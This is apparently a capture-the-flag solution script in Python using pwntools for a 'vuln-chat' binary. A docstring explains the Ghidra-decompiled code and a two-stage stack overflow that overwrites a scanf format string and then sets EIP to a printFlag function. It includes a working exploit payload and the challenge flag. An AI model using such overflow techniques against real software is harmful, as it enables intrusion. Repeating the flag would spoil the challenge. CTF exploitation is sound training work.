#!/usr/bin/python3
'''
Seems like we have 2 buffers to overflow, in order to pwn it.

main function from Ghidra
--------------------------
{
  undefined local_31 [20];
  undefined local_1d [20];
  undefined4 local_9;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
--------------------------
Ghidra also shows there is a printFlag function with the address of 0x804856b <- this is where we will return to
The program uses scanf, so we cannot really control how much we can overflow.
2 buffers have 20 bytes, but local_9 seems to be able to read in 30 bytes: 0x73303325 = %30s
first scanf, we fill up 20 bytes, then overflow & overwrite local_9 variable to change %30s into something bigger -> increases overflow size
then with the second scanf with a bigger read buffer, we can overwrite eip and return to printFlag

Flag:
flag{g0ttem_b0yz}
Use it wisely
'''
import pwn as p

def pwn():
    start = p.process('./vuln-chat')
    firstPayload = b'A'*20 + b'%69s' #overflow and overwrite %30s with %69s
    secondPayload = b'A'*0x31 + p.p32(0x804856b) #overflow second buffer and ebp, overwrite eip with printFlag addr
    start.sendline(firstPayload)
    start.sendline(secondPayload)
    start.interactive()

if __name__ == "__main__":
    pwn()
